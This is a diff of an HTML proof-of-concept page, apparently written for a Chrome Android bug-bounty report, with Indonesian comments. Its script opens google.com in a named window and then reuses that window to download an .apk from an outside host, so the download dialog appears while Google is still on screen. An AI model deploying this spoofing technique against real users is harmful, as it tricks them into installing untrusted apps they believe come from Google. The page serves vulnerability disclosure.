@@ -1,33 +1,42 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>PoC Download Spoofing</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC Insecure Download Handling</title>
 </head>
-<body style="text-align: center; margin-top: 50px;">
+<body style="font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
 
-    <h2>Chrome VRP PoC - Insecure Download Handling</h2>
-    
-    <button id="downloadBtn" style="padding: 15px; cursor: pointer;">
-        Klik untuk Download Update (Google)
+    <h1>Chrome Android VRP PoC</h1>
+    <p>Klik tombol di bawah untuk simulasi download spoofing:</p>
+
+    <button id="triggerBtn" style="background-color: #4CAF50; border: none; color: white; padding: 15px 32px; font-size: 16px; cursor: pointer; border-radius: 8px;">
+        Download From Original Site
     </button>
 
     <script>
-        document.getElementById('downloadBtn').onclick = function() {
-            // 1. Membuka origin target (Google) di tab bernama 'target_tab'
-            window.open('https://www.google.com', 'target_tab');
+        document.getElementById('triggerBtn').onclick = function() {
+            // STEP 1: Membuka origin terpercaya di window bernama 'x'
+            // User akan melihat tab berpindah ke Google.com
+            window.open('https://google.com', 'x');
 
-            // 2. Memberikan delay agar Google terbuka sempurna
-            // Lalu menimpa tab yang sama dengan file APK dari origin attacker
+            // STEP 2: Menunggu 5 detik (Race Condition / Timing)
+            // Setelah 5 detik, window 'x' akan dipaksa mengunduh file .apk dari server attacker
             setTimeout(function() {
-                console.log("Memicu spoofed download...");
-                window.open('https://frozzipies.github.io/test.apk', 'target_tab');
-            }, 5000); 
+                console.log("Memicu download .apk pada tab Google...");
+                window.open('https://frozzipies.github.io/test.apk', 'x');
+            }, 5000);
         };
     </script>
 
-    <p style="color: gray; margin-top: 20px;">
-        Jika rentan: Dialog download .apk akan muncul saat layar menampilkan google.com.
-    </p>
+    <div style="margin-top: 40px; text-align: left; display: inline-block; border: 1px solid #ccc; padding: 20px;">
+        <h3>Ringkasan Bug:</h3>
+        <ul>
+            <li><strong>Rentan:</strong> Jika dialog <em>"File might be harmful"</em> muncul saat layar masih menampilkan <strong>google.com</strong>.</li>
+            <li><strong>Tidak Rentan:</strong> Jika browser membatalkan download karena origin tidak sesuai, atau dialog dengan jelas menyebutkan file berasal dari <strong>frozzipies.github.io</strong>.</li>
+            <li><strong>Dampak:</strong> User terkecoh menganggap file .apk tersebut resmi/aman dari Google.</li>
+        </ul>
+    </div>
 
 </body>
 </html>
